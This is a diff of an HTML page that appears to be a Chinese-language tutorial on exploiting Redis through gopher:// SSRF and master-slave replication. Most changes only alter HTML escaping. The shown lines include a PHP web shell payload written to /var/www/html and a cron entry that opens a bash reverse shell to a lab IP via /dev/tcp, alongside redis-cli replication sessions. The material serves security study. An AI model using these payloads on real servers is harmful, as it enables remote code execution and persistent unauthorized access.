@@ -420,11 +420,11 @@
 <p>我们用<code>tcpdump</code>来抓个包来测试一下</p>
 <pre><code>tcpdump port 6379 -w ./Desktop/1.pcap
 </code></pre><p>redis客户端中执行如下命令</p>
-<pre class=" language-sh"><code class="language-sh">192.168.163.128:6379&gt; set name test
+<pre class=" language-sh"><code class="language-sh">192.168.163.128:6379> set name test
 OK
-192.168.163.128:6379&gt; get name
+192.168.163.128:6379> get name
 "test"
-192.168.163.128:6379&gt;
+192.168.163.128:6379>
 
 </code></pre>
 <p>抓到的数据包如下</p>
@@ -455,7 +455,7 @@ save
 protocol<span class="token operator">=</span><span class="token string">"gopher://"</span>
 ip<span class="token operator">=</span><span class="token string">"192.168.163.128"</span>
 port<span class="token operator">=</span><span class="token string">"6379"</span>
-shell<span class="token operator">=</span><span class="token string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span>
+shell<span class="token operator">=</span><span class="token string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?>\n\n"</span>
 filename<span class="token operator">=</span><span class="token string">"shell.php"</span>
 path<span class="token operator">=</span><span class="token string">"/var/www/html"</span>
 passwd<span class="token operator">=</span><span class="token string">""</span>
@@ -522,7 +522,7 @@ save
 </code></pre><p>转化为redis RESP协议的格式<br><strong>PS：将第一个脚本改一下</strong></p>
 <pre class=" language-python"><code class="language-python">reverse_ip<span class="token operator">=</span><span class="token string">"192.168.163.132"</span>
 reverse_port<span class="token operator">=</span><span class="token string">"2333"</span>
-cron<span class="token operator">=</span><span class="token string">"\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n"</span><span class="token operator">%</span><span class="token punctuation">(</span>reverse_ip<span class="token punctuation">,</span>reverse_port<span class="token punctuation">)</span>
+cron<span class="token operator">=</span><span class="token string">"\n\n\n\n*/1 * * * * bash -i >&amp; /dev/tcp/%s/%s 0>&amp;1\n\n\n\n"</span><span class="token operator">%</span><span class="token punctuation">(</span>reverse_ip<span class="token punctuation">,</span>reverse_port<span class="token punctuation">)</span>
 filename<span class="token operator">=</span><span class="token string">"root"</span>
 path<span class="token operator">=</span><span class="token string">"/var/spool/cron"</span>
 </code></pre>
@@ -552,21 +552,21 @@ redis-server /etc/redis/redis6380.conf
 </code></pre>
 <p>我们把master_ip设置为<code>127.0.0.1</code>，master_port为<code>6380</code></p>
 <pre class=" language-sh"><code class="language-sh">root@kali:/usr/bin# redis-cli -p 6379
-127.0.0.1:6379&gt; SLAVEOF 127.0.0.1 6380
+127.0.0.1:6379> SLAVEOF 127.0.0.1 6380
 OK
-127.0.0.1:6379&gt; get test
+127.0.0.1:6379> get test
 (nil)
-127.0.0.1:6379&gt; exit
+127.0.0.1:6379> exit
 root@kali:/usr/bin# redis-cli -p 6380
-127.0.0.1:6380&gt; get test
+127.0.0.1:6380> get test
 (nil)
-127.0.0.1:6380&gt; set test "test"
+127.0.0.1:6380> set test "test"
 OK
-127.0.0.1:6380&gt; get test
+127.0.0.1:6380> get test
 "test"
-127.0.0.1:6380&gt; exit
+127.0.0.1:6380> exit
 root@kali:/usr/bin# redis-cli -p 6379
-127.0.0.1:6379&gt; get test
+127.0.0.1:6379> get test
 "test"
 </code></pre>
 <p>执行一波，我们可以明显看到数据达到了同步的效果.<br>如果我们想解除主从关系可以执行<code>SLAVEOF NO ONE</code></p>
